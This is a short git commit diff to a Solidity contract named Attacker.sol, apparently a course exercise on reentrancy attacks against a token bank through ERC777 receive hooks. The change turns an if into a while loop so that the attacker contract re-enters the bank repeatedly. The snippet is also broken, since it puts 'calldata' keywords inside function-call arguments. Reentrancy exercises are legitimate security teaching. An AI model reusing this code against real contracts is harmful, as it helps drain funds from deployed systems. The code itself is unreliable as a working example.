dd24d89b080b0b0b362e678817a2e3d0e15232b0
lawrencechangit <118051543+lawrencechangit@users.noreply.github.com>
2023-03-16 10:15:33 +0800

    Update Attacker.sol

--- Attacker.sol
+++ Attacker.sol
@@ -65,7 +65,7 @@ contract Attacker is AccessControl, IERC777Recipient {
 		//YOUR CODE TO RECURSE GOES HERE
 			ERC777 token = bank.token();
 			require(msg.sender == address(token), "Invalid token");
-			if (address(from).balance > 0 ) {
+			while (address(from).balance > 0 ) {
            			//bank.claimAll();
             			bank.tokensReceived(operator,from, to, amount, calldata userData, calldata operatorData);
         }
